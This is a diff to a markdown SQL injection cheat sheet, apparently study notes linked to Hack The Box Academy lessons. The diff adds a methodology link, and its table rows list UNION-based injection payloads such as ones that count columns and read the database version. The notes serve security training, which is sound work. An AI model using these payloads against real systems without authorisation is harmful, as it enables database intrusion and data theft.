@@ -95,7 +95,7 @@ FROM
 
 | **Payload**   | **Description**   |
 | --------------|-------------------|
-| **Union Injection** |
+| **Union Injection** | [Methodology of SQL Injection with UNION, from detecting number of columns to locating of injection](https://academy.hackthebox.com/module/33/section/216) |
 | `' order by 1-- -` | Detect number of columns using `order by` |
 | `cn' UNION select 1,2,3-- -` | Detect number of columns using Union injection [Union Clause - Columns](https://academy.hackthebox.com/module/33/section/806) |
 | `cn' UNION select 1,@@version,3,4-- -` | Basic Union injection |
